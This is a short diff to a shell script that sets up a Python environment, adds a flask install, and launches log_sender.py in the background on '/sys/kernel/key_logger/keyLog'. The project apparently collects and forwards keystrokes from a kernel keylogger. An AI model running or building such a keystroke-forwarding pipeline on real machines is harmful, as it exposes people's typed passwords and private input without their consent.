@@ -28,6 +28,7 @@ mkdir ../myenv
 tar -xf ../BE/klenv.tar.gz -C ../myenv
 source ../myenv/bin/activate
 pip install python-dotenv
+pip install flask
 echo "Running BackEnd script in: "
 echo $(which python)
 $(which python) ../BE/log_sender.py -f "/sys/kernel/key_logger/keyLog"  -t 5 &
